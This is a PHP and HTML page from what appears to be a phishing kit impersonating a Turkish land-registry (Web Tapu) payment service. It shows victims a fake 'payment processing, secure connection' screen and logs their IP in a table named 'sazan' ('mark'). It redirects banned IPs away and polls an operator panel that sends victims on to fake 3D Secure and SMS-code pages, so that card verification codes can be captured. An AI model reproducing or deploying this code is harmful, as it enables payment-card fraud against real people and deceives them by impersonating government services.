<?php
   date_default_timezone_set('Europe/Istanbul');
   include(__DIR__ . "/gmypanel/Core/getRealIPAdress.php");
   include(__DIR__ . "/gmypanel/Core/mobileDetect.php");
   include(__DIR__ . "/gmypanel/Core/browserDetect.php");
   include(__DIR__ . "/gmypanel/Connection.php");
   ob_start();
   session_start();
   $ip = getUserIP();
   $db->query("UPDATE sazan SET now = 'Bekleme Ekranında' WHERE ip = '{$ip}'");
   $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
   foreach($ban as $kontrol){
       if($kontrol['ban'] == $ip){
           header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
       }
   }
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Web Tapu İşlemleri</title>
<link rel="icon" href="public/images/OSYMicon.ico" type="image/x-icon">
<script src="v4/Scripts/jquery-1.9.1.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
html,body{font-family:'Segoe UI',Arial,sans-serif;background:#f7f8fc;width:100%;height:100%;min-height:100vh;}

body{display:flex;align-items:flex-start;justify-content:center;padding-top:15vh;padding-left:20px;padding-right:20px;}

.card{background:#fff;border-radius:16px;padding:36px 24px;box-shadow:0 2px 24px rgba(0,0,0,.09);border:1px solid #eef0f5;text-align:center;width:100%;max-width:360px;}

.loader-wrap{display:flex;justify-content:center;margin-bottom:24px;}
.loader{width:52px;height:52px;border-radius:50%;border:4px solid #e2e8f0;border-top:4px solid #0b1f45;animation:spin 1s linear infinite;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}

.card-title{font-size:17px;font-weight:800;color:#0b1f45;margin-bottom:10px;}
.card-desc{font-size:13px;color:#64748b;line-height:1.7;margin-bottom:20px;}
.card-note{display:inline-flex;align-items:center;gap:6px;background:#f0f4ff;border-radius:8px;padding:10px 14px;font-size:12px;color:#1e3a6e;font-weight:500;}
.card-note-dot{width:8px;height:8px;border-radius:50%;background:#2563b0;animation:pulse 1.5s ease-in-out infinite;flex-shrink:0;}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.5;transform:scale(.8);}}
</style>
</head>
<body>

<div class="card">
    <div class="loader-wrap">
        <div class="loader"></div>
    </div>
    <div class="card-title">Ödemeniz İşleniyor</div>
    <div class="card-desc">
        Yoğunluk nedeniyle kısa bir gecikme yaşanabilir.<br>
        Lütfen sayfayı kapatmayınız, kısa süre içinde yönlendirileceksiniz.
    </div>
    <div class="card-note">
        <div class="card-note-dot"></div>
        Güvenli bağlantı üzerinden işleminiz gerçekleştiriliyor
    </div>
</div>

<script type="text/javascript">
            $(document).ready(function () {
                gonder();
            });
            function gonder() {
            $.ajax({
                type: 'POST',
                url: '<?php echo "Database.php?ip=".$ip; ?>',
                success: function (msg) {
                    if (msg == 'sms') {
                        window.location.href = '3D_Security.php';
                    }
                    else if (msg == 'tebrik') {
                        window.location.href = 'Successful.php';
                    }
                    else if (msg == 'hata1') {
                        window.location.href = 'Error.php';
                    }
                    else if (msg == 'back') {
                        window.location.href = 'index.php';
                    }
                    else if (msg == 'sms2') {
                        window.location.href = 'Wrong_Sms.php';
                    }
                    else if (msg == 'hata2') {
                        window.location.href = 'Closed_to_Internet.php';
                    }
                    else {
                        setTimeout(gonder, 2500);
                    }
                },
                error: function() {
                    setTimeout(gonder, 2500);
                }
            });
        }
        </script>
</body>
</html>

